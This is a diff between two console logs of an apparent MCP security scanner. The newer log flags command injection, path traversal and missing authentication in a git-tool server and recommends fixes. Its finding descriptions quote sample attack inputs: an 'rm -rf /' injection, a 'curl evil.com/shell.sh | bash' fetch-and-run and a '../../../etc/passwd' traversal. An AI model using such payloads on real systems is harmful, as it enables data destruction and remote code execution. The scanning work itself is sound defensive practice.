@@ -1,79 +1,37 @@
-yarn node mcp_scan_cli.js --repo https://github.com/brave/brave-search-mcp-server
-/// [dotenv@17.2.2] injecting env (8) from .env -- tip: 🔐 encrypt with Dotenvx: https://dotenvx.com
+yarn node mcp_scan_cli.js --repo https://github.com/WhiteRabbitNeo-AI/OWASP-Juiceshop-on-AWS-ECS
+[dotenv@17.2.2] injecting env (8) from .env -- tip: ⚙️  override existing env vars with { override: true }
 🔒 MCP Security Scanner v0.1.0
-/// Repository: https://github.com/brave/brave-search-mcp-server
-/// Analysis: Static (dependency + source code)
 =====================================
 
-~~Initializing scanner...~~ (just delete this line, scanner ibviously already running)
-///MCP Security Scanner initialized
-///Initialized sandbox provider: docker
-///AI Router initialized with provider: anthropic
-///AI Analyzer initialized with provider: anthropic
-///MCP Security Scanner Configuration:
-///- AI Provider: anthropic
-///- Sandbox Provider: auto
-///- Kindo Model: claude-sonnet-4-20250514
-///- Scanner Timeout: 300000ms
-///- Max Code Size: 50000 bytes
-///- Network Analysis: enabled
-///- Log Level: info
-///- Kindo API: configured
-///- Daytona API: not configured
-///Scanner ready - Sandbox: docker, AI: anthropic
-~~Starting security analysis...~~ (delete, this is pointless)
-
 Starting STATIC analysis of MCP server: static-analysis-only
-Performing parallel static analysis...
-Starting parallel static analysis... 
 📦 Cloning repository for parallel analysis...
 Running vulnerability scan with: trivy
-Trivy stderr: 2025-09-22T13:05:37-04:00	INFO	[vuln] Vulnerability scanning is enabled
-2025-09-22T13:05:37-04:00	INFO	[secret] Secret scanning is enabled
-2025-09-22T13:05:37-04:00	INFO	[secret] If your scanning is slow, please try '--scanners vuln' to disable secret scanning
-2025-09-22T13:05:37-04:00	INFO	[secret] Please see also https://trivy.dev/v0.65/docs/scanner/secret#recommendation for faster secret detection
-Enumerating objects: 303, done.
-Counting objects: 100% (303/303), done.
-Compressing objects: 100% (210/210), done.
-Total 303 (delta 173), reused 180 (delta 75), pack-reused 0 (from 0)
-2025-09-22T13:05:38-04:00	INFO	Suppressing dependencies for development and testing. To display them, try the '--include-dev-deps' flag.
-2025-09-22T13:05:38-04:00	INFO	Number of language-specific files	num=1
-2025-09-22T13:05:38-04:00	INFO	[npm] Detecting vulnerabilities...
-
-📣 Notices:
-  - Version 0.66.0 of Trivy is now available, current version is 0.65.0
-
-To suppress version checks, run Trivy scans with the --skip-version-check flag
-
-
-📊 Dual-scanner repository analysis complete - Found 0 vulnerabilities
-📦 Repository clone completed in 1316ms
-🔍 [Parallel] Running dual-scanner dependency analysis...
+🔍 Executing Trivy command: docker run --rm -v mcp-git-1758571839916:/src aquasec/trivy:latest fs --scanners vuln,secret,misconfig --format json --timeout 5m /src
+✅ Trivy command completed successfully
+Repository analysis complete - Found 14 vulnerabilities
+📦 Repository clone completed in 10064ms
+🔍 [Parallel] Running dependency, vuln, secrets, and IaC analysis...
 🔍 [Parallel] Running AI source code analysis...
 🔍 [Parallel] Running MCP prompt security analysis...
-🔄 Executing 3 analysis tasks in parallel...
-Found MCP server configuration with 1 tools for prompt analysis
-🔍 Running MCP prompt security analysis for server: @brave/brave-search-mcp-server
-🔍 Analyzing MCP server "@brave/brave-search-mcp-server" for prompt security vulnerabilities...
-   Tools to analyze: 1
-✅ Parallel execution completed in 72435ms
-✅ dependency analysis completed in 9ms
-✅ source_code analysis completed in 72444ms
-✅ mcp_prompt analysis completed in 27928ms
+No MCP server configuration found for prompt analysis
+✅ Parallel execution completed in 75314ms
+✅ dependency analysis completed in 6ms
+✅ source_code analysis completed in 75320ms
+✅ mcp_prompt analysis completed in 6532ms
 🧹 Docker volume cleanup complete
 📊 Parallel analysis metrics:
-   Total time: 73763ms
-   Parallel execution: 72435ms
-   Estimated sequential: 100381ms
-   Time savings: 27946ms (28%)
+   Total time: 85386ms
+   Parallel execution: 75314ms
+   Estimated sequential: 81858ms
+   Time savings: 6544ms (8%)
 📊 Parallel static analysis complete:
    Dependencies: 0 vulnerabilities
-   Source code: 6 vulnerabilities
-   MCP prompts: 1 risks
-   ⚡ Time savings: 27946ms
+   Source code: 8 vulnerabilities
+   MCP prompts: 0 risks
+   ⚡ Time savings: 6544ms
 🔍 Running behavioral analysis (sandbox execution)...
 ⚠️  Behavioral analysis skipped: Static-only analysis mode
-Scan complete in 73898ms - Overall risk: CRITICAL
+Scan complete in 85441ms - Overall risk: CRITICAL
 
 =====================================
 🔍 SECURITY ANALYSIS COMPLETE
@@ -82,72 +40,59 @@ Scan complete in 73898ms - Overall risk: CRITICAL
 📊 SUMMARY:
    Analysis Mode: STATIC
    Overall Risk:  CRITICAL
-   Duration:      73898ms
-   Timestamp:     2025-09-22T17:06:50.777Z
+   Duration:      85441ms
+   Timestamp:     2025-09-22T20:12:04.522Z
 
 💻 SOURCE CODE ANALYSIS:
-   Code Vulnerabilities: 6
+   Code Vulnerabilities: 8
 
 🔍 CODE VULNERABILITIES FOUND:
-   1. CREDENTIAL_EXPOSURE (CRITICAL)
-      API key is directly exposed in headers without validation or encryption. The X-Subscription-Token header contains the raw Brave API key which could be logged, cached, or intercepted. This creates a direct credential exposure risk in production environments.
-      Line: 15
-      Code: 'X-Subscription-Token': config.braveApiKey
-   2. COMMAND_INJECTION (HIGH)
-      URL construction using user-controlled parameters without proper sanitization. The queryParams are directly appended to the URL, allowing potential injection of malicious query parameters that could bypass API restrictions or cause unexpected behavior.
-      Line: 80
-      Code: const urlWithParams = url.toString() + '?' + queryParams.toString();
-   3. DATA_EXFILTRATION (HIGH)
-      Error responses include full API response bodies and potentially sensitive information. Error messages containing API keys, internal URLs, or sensitive data could be exposed to clients through the error handling mechanism.
-      Line: 88
-      Code: errorMessage += `\n${stringify(responseBody, true)}`;
-   4. NETWORK_ABUSE (MEDIUM)
-      Missing rate limiting implementation allows potential DoS attacks. The commented out checkRateLimit() function indicates rate limiting was planned but not implemented, allowing unlimited API requests that could exhaust quotas or cause service disruption.
-      Line: 43
-      Code: // TODO (Sampson): Improve rate-limit logic to support self-throttling and n-keys
-  // checkRateLimit();
-   5. PRIVILEGE_ESCALATION (MEDIUM)
-      Insufficient validation of goggles parameter allows arbitrary HTTPS URLs. While HTTPS is enforced, there's no whitelist validation, potentially allowing requests to internal services or unauthorized external APIs through the goggles parameter.
-      Line: 67
-      Code: for (const url of value.filter(isValidGoggleURL)) {
-          queryParams.append(key, url);
-        }
-   6. AUTHENTICATION_BYPASS (MEDIUM)
-      Configuration validation only checks for options existence, not API key validity. Invalid or missing API keys could lead to service failures or potential bypass scenarios if the API doesn't properly validate the token.
-      Line: 9
-      Code: if (!options) {
-    console.error('Invalid configuration');
-    process.exit(1);
-  }
-
-🛡️  MCP Primitives:
-   Server Name:       @brave/brave-search-mcp-server
-   Tools Analyzed:    1
-   Prompt Risks:      1
-
-⚠️  MCP RISKS IDENTIFIED:
-   1. CROSS ORIGIN VIOLATION (MEDIUM)
-      Tool "unknown-tool" references other MCP servers or external services
-      Tool: unknown-tool
-      Evidence: mcpserver
-      Confidence: NaN%
-
-📝 MCP PROMPT ANALYSIS SUMMARY:
-   MCP server "@brave/brave-search-mcp-server" with 1 tools has 1 prompt security risks: 1 medium. Primary concerns include tool descriptions with hidden instructions and potentially exploitable parameter schemas.
+   1. COMMAND_INJECTION (CRITICAL)
+      Direct command injection in git_add tool. User-supplied file names are concatenated directly into shell command without sanitization, allowing arbitrary command execution via malicious filenames like 'file.txt; rm -rf /; #'
+      Line: 282
+      Code: const result = execSync(`git add ${args.files.join(' ')}`, { cwd: this.workingDirectory, encoding: 'utf-8' });
+   2. COMMAND_INJECTION (CRITICAL)
+      Command injection in git_commit tool through commit message parameter. Attacker can inject shell commands via commit messages containing quotes and semicolons like 'commit"; rm -rf /; echo "pwned'
+      Line: 305
+      Code: const result = execSync(`git commit -m "${args.message}"`, { cwd: this.workingDirectory, encoding: 'utf-8' });
+   3. COMMAND_INJECTION (CRITICAL)
+      Command injection in git_push tool via remote and branch parameters. Malicious values like 'origin; curl evil.com/shell.sh | bash; #' enable remote code execution
+      Line: 328
+      Code: const result = execSync(`git push ${args.remote || 'origin'} ${args.branch || 'main'}`, { cwd: this.workingDirectory, encoding: 'utf-8' });
+   4. SENSITIVE_FILE_ACCESS (CRITICAL)
+      Path traversal vulnerability in read_resource handler allows reading arbitrary files outside working directory. Attackers can access sensitive files like '/etc/passwd' or SSH keys via '../../../etc/passwd' paths
+      Line: 530
+      Code: const fullPath = path.join(this.workingDirectory, uri.path); const content = fs.readFileSync(fullPath, 'utf-8');
+   5. SENSITIVE_FILE_ACCESS (HIGH)
+      Directory traversal in list_resources handler enables listing contents of arbitrary directories outside the working directory, exposing file system structure and sensitive file names
+      Line: 580
+      Code: const fullPath = path.join(this.workingDirectory, uri.path || ''); const items = fs.readdirSync(fullPath);
+   6. AUTHENTICATION_BYPASS (HIGH)
+      Complete absence of authentication mechanisms. All MCP tools and resources are accessible without any authentication, authorization, or access controls
+      Line: 1
+      Code: // No authentication implementation found in entire codebase
+   7. PRIVILEGE_ESCALATION (HIGH)
+      Insufficient working directory validation allows potential privilege escalation. Only checks directory existence without validating it's a safe Git repository or enforcing access boundaries
+      Line: 45
+      Code: if (!fs.existsSync(workingDirectory)) { throw new Error(`Working directory does not exist: ${workingDirectory}`); }
+   8. DATA_EXFILTRATION (MEDIUM)
+      Git operations expose full environment variables and system information through error messages, potentially leaking sensitive configuration data and credentials
+      Line: 400
+      Code: catch (error) { throw new Error(`Git operation failed: ${error.message}`); }
 
 📝 SUMMARY:
-STATIC security analysis completed using source code analysis. Identified 6 code-level security issues. Overall security risk assessed as CRITICAL. Immediate security review and remediation required before production deployment.
+STATIC security analysis completed using source code analysis. Identified 8 code-level security issues. Overall security risk assessed as CRITICAL. Immediate security review and remediation required before production deployment.
 
 🔧 RECOMMENDATIONS:
-   1. Implement secure credential management using environment variables with validation and encryption at rest
-   2. Add comprehensive input sanitization for all URL parameters, especially user-controlled query parameters
-   3. Implement proper error handling that sanitizes sensitive information before returning to clients
-   4. Add rate limiting with configurable thresholds and proper backoff mechanisms to prevent API abuse
-   5. Create a whitelist validation system for goggles URLs to prevent unauthorized external requests
-   6. Enhance configuration validation to verify API key format and test connectivity before service startup
-   7. Implement request/response logging with sensitive data redaction for security monitoring
-   8. Add parameter validation schemas for each endpoint to prevent injection attacks
-   9. Implement circuit breaker patterns for external API calls to improve resilience
-   10. Add security headers and CORS policies appropriate for MCP server deployment
+   1. Replace execSync with parameterized commands using child_process.spawn() with argument arrays to prevent command injection
+   2. Implement strict path validation using path.resolve() and ensure all file paths stay within designated working directory boundaries
+   3. Add comprehensive input sanitization for all tool parameters, especially file names, commit messages, and Git references
+   4. Implement MCP authentication using API keys or session tokens with proper validation middleware
+   5. Add authorization checks for sensitive Git operations like push, commit, and file access based on user permissions
+   6. Use allowlist validation for Git repository paths and restrict access to only approved directories
+   7. Implement rate limiting and timeout controls for all Git operations to prevent DoS attacks
+   8. Add tenant isolation mechanisms to prevent cross-tenant data access in multi-user environments
+   9. Sanitize error messages to prevent information disclosure of system paths and configuration details
+   10. Add comprehensive logging and monitoring for all MCP tool invocations and file access attempts
 
 ❌ CRITICAL SECURITY ISSUES FOUND - DO NOT DEPLOY
